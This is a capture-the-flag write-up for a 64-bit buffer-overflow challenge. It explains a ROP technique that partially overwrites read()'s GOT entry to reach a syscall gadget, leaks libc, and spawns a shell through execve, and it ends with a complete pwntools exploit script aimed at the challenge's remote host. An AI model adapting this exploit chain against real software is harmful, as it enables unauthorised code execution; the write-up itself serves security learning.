checksec outputs the following:

   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x3fe000)

Looking at the executable, there is not much going on. The main() function  
simply calls vuln(), which is the following in C:

void vuln(void)  
{  
 char buf[10];  
 read(0,buf,0xaa);  
}

This is a simple buffer overflow to overwrite the base pointer and return  
pointer. Immediately we have a problem: no gadgets to edit rdx, and no gadgets  
to make a syscall. Recall that NX is enabled, which means we can't load  
shellcode easily. mprotect() requires a syscall gadget anyway. To get around  
this, we make an educated guess that the read() libc function uses the syscall  
instruction, and hope it's close enough to the beginning of the function that  
we can overwrite the lowest byte of read()'s GOT entry to point it to the  
syscall.

Disassembling the read(), we get:

           ;-- read:                                                             
  
           0x00110180      488d0571072e.  lea rax, [0x003f08f8]        
           0x00110187      8b00           mov eax, dword [rax]         
           0x00110189      85c0           test eax, eax                
       ,=< 0x0011018b      7513           jne 0x1101a0                 
       |   0x0011018d      31c0           xor eax, eax                 
       |   0x0011018f      0f05           syscall                      
       |   0x00110191      483d00f0ffff   cmp rax, 0xfffffffffffff000            
  
      ,==< 0x00110197      7757           ja 0x1101f0                            
  
      ||   0x00110199      f3c3           ret                                    

We're not concerned about the ja since that branch will only be taken if the  
system call returns an error. This is effectively a syscall; ret sequence at  
offset 0x11018f. We can edit the lowest byte 0x80 of the read() GOT entry to  
0x8f to point it to this gadget by using the read() PLT entry. However, since  
we don't have control of rdx, the read size will have to be 0xaa. We can
simply  
enter one byte only to make this read only one byte. We add the following call  
to our stack payload:

read@PLT(1,ptr_got_read,0xaa)

After this call, we can use the write() system call to get a leak. Since
read()  
read in only one byte, rax is equal to 1. If we immediately use the syscall  
gadget, this will be a write() system call.

write(1,ptr_got_read,0xaa)

This will get us a libc pointer leak. Now we need to call read() again to load  
"/bin/sh" and the other two execve() args somewhere in preparation for  
execve(). In the vuln() function the assembly looks something like this:

mov eax,0  
call read@PLT

We can use this to call read despite having overwritten the read() GOT entry.

Finally, we invoke vuln() using the last return pointer of this payload to get  
a new payload onto the stack to call execve().

Here is the full exploit script:  
```

#!/usr/bin/env python3

from pwn import *  
import time

#p = process("./one_and_a_half_man")  
p = remote("one-and-a-half-man.3k.ctf.to",8521)

ptr_plt_read = 0x4004b0  
ptr_rel_read = 0x601018  
ptr_pop_rdi = 0x00400693  
ptr_pop_rsi_r15 = 0x00400691  
ptr_vuln = 0x4005b7  
ptr_buf = 0x601070  
ptr_read_gadget = 0x4005cb

buf = b'A' * 10  
buf += p64(ptr_buf)  
buf += p64(ptr_pop_rsi_r15) + p64(ptr_rel_read) + p64(0)  
buf += p64(ptr_plt_read)  
buf += p64(ptr_pop_rdi) + p64(1)  
buf += p64(ptr_plt_read)  
buf += p64(ptr_pop_rsi_r15) + p64(ptr_buf) + p64(0)  
buf += p64(ptr_read_gadget)

p.send(buf + bytes(0xaa - len(buf)))  
p.send(b'\x8f')

s = p.recvn(0xaa)  
ptr_leak = int.from_bytes(s[:8],"little")  
ptr_libc = ptr_leak - 0x11018f

print(hex(ptr_libc))  
#sys.stdin.readline()

ptr_pop_rax = ptr_libc + 0x43a78  
ptr_pop_rdx = ptr_libc + 0x1b96  
ptr_syscall = ptr_libc + 0x13c0

buf = p64(ptr_buf)  
buf += p64(ptr_pop_rax) + p64(59)  
buf += p64(ptr_pop_rdx) + p64(0)  
off = 0x58  
buf += p64(ptr_pop_rdi) + p64(ptr_buf + off)  
buf += p64(ptr_pop_rsi_r15) + p64(ptr_buf + off + 8) + p64(0)  
buf += p64(ptr_syscall)  
buf += b"/bin/sh\x00"  
buf += p64(ptr_buf + off) + p64(0)

p.send(buf)

p.interactive()

```